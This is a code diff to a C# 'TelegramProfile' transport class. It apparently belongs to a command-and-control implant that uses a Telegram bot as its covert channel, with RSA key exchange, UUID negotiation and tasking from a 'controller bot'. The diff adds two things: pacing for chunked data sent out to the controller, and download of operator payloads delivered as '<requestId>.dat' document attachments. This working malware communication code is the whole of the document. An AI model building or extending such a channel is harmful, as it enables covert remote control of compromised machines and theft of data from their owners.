@@ -27,6 +27,7 @@ namespace TelegramTransport
         private readonly RSAKeyGenerator _rsa;
         private bool _keyExchanged;
         private bool _uuidNegotiated;
+        private string? _lastDocFileId;
 
         public TelegramProfile(
             Dictionary<string, string> data,
@@ -180,6 +181,12 @@ namespace TelegramTransport
                 };
 
                 _telegram.SendText(_controllerBot, JsonCodec.Serialize(envelope));
+
+                // pace bursts so Telegram's per-chat rate limits don't drop chunks
+                if (index < chunks - 1)
+                {
+                    System.Threading.Thread.Sleep(350);
+                }
             }
         }
 
@@ -193,8 +200,32 @@ namespace TelegramTransport
                 foreach (TelegramUpdate update in updates)
                 {
                     TelegramMessage? message = update.Message;
-                    if (message == null ||
-                        message.From == null ||
+                    if (message == null)
+                    {
+                        continue;
+                    }
+
+                    // document delivery: the controller sends large payloads as file
+                    // attachments named <requestId>.dat; the document may arrive in the
+                    // same batch as (or before/after) the tasking we are waiting on.
+                    if (message.Document != null &&
+                        !string.IsNullOrWhiteSpace(message.Document.FileId))
+                    {
+                        _lastDocFileId = message.Document.FileId;
+                        if (string.Equals(
+                                message.Document.FileName,
+                                requestId + ".dat",
+                                StringComparison.Ordinal))
+                        {
+                            byte[]? docData = _telegram.DownloadDocument(message.Document.FileId);
+                            if (docData != null)
+                            {
+                                return System.Text.Encoding.UTF8.GetString(docData);
+                            }
+                        }
+                    }
+
+                    if (message.From == null ||
                         !message.From.IsBot ||
                         !string.Equals(
                             NormalizeUsername(message.From.Username ?? string.Empty),
@@ -229,19 +260,18 @@ namespace TelegramTransport
                     bool isPushedTasking = string.IsNullOrEmpty(envelope.ReplyToPacketId);
                     string assembled;
 
-                    // document delivery: the payload is in a previously sent document
+                    // document availability marker: the payload itself arrives as a
+                    // document; never feed the marker through the chunk assembler.
                     if (envelope.Message == "DOC" && completesRequest)
                     {
-                        // find the most recent document in the chat
-                        TelegramUpdate[] docUpdates = _telegram.GetUpdates(0);
-                        foreach (TelegramUpdate docUpdate in docUpdates)
+                        if (!string.IsNullOrWhiteSpace(_lastDocFileId))
                         {
-                            var doc = docUpdate.Message?.Document;
-                            if (doc == null || string.IsNullOrWhiteSpace(doc.FileId)) continue;
-                            byte[]? docData = _telegram.DownloadDocument(doc.FileId);
-                            if (docData != null) { correlatedPayload = System.Text.Encoding.UTF8.GetString(docData); break; }
+                            byte[]? docData = _telegram.DownloadDocument(_lastDocFileId);
+                            if (docData != null)
+                            {
+                                return System.Text.Encoding.UTF8.GetString(docData);
+                            }
                         }
-                        if (correlatedPayload != null) { return correlatedPayload; }
                         continue;
                     }
                     if ((!completesRequest && !isPushedTasking) ||
